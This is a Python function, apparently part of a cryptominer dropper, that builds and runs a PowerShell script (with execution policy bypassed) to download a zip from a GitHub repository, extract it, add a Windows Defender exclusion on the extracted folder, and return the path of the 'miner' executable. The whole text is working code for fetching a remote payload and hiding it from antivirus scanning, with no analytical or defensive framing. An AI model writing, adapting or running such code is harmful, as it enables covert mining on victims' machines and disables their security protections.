def prepare_with_powershell():
    """Use PowerShell to download, extract, exclude, and return miner paths."""
    hawk.info("[POWERSHELL] Starting custom miner download via PowerShell")
    if not check_internet():
        hawk.error("[POWERSHELL] No internet connection")
        return None

    ps_script = f'''
$ErrorActionPreference = "Stop"
$repoUrl = "{GITHUB_REPO}/archive/refs/heads/{BRANCH}.zip"
$tmpZip = "$env:TEMP\\repo.zip"
$extractDir = "$env:TEMP\\repo_ext"
$folderName = "{FOLDER_NAME}"
$exeName = "{EXE_NAME}.exe"

# Download
Invoke-WebRequest -Uri $repoUrl -OutFile $tmpZip -UseBasicParsing
# Extract
Expand-Archive -Path $tmpZip -DestinationPath $extractDir -Force
# Find the target folder by exact name
$packzz = Get-ChildItem $extractDir -Recurse -Directory | Where-Object {{ $_.Name -eq $folderName }} | Select-Object -First 1
if (-not $packzz) {{
    Write-Host 'FOLDER_NOT_FOUND'
    exit 1
}}
# Add Defender exclusion on the folder
Add-MpPreference -ExclusionPath $packzz.FullName -Force -ErrorAction SilentlyContinue
# Extract any inner ZIPs
Get-ChildItem $packzz.FullName -Recurse -Filter '*.zip' | ForEach-Object {{
    Expand-Archive -Path $_.FullName -DestinationPath $packzz.FullName -Force
}}
# Find the exe
$exe = Get-ChildItem $packzz.FullName -Recurse -File | Where-Object {{ $_.Name -eq $exeName }} | Select-Object -First 1
if (-not $exe) {{
    Write-Host 'EXE_NOT_FOUND'
    exit 2
}}
# Output JSON with paths – DO NOT delete the extractDir yet; Python will handle it
$result = @{{
    exe = $exe.FullName
    install_dir = $packzz.FullName
}} | ConvertTo-Json -Compress
Write-Host $result
# Cleanup only the zip, leave the extracted folder
Remove-Item $tmpZip -Force -ErrorAction SilentlyContinue
'''

    try:
        proc = subprocess.run(
            ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
            capture_output=True, text=True, timeout=120
        )
        output = proc.stdout.strip()
        hawk.debug(f"[POWERSHELL] Output: {output}")
    except Exception as e:
        hawk.error(f"[POWERSHELL] Execution failed: {e}")
        return None

    if 'FOLDER_NOT_FOUND' in output:
        hawk.error("[POWERSHELL] Target folder not found in repo")
        return None
    if 'EXE_NOT_FOUND' in output:
        hawk.error("[POWERSHELL] Miner exe not found inside folder")
        return None

    try:
        info = json.loads(output)
        exe_path = info['exe']
        install_dir = info['install_dir']
        hawk.info(f"[POWERSHELL] Miner extracted to: {exe_path}")
        return exe_path, install_dir
    except:
        hawk.error("[POWERSHELL] Failed to parse JSON output")
        return None

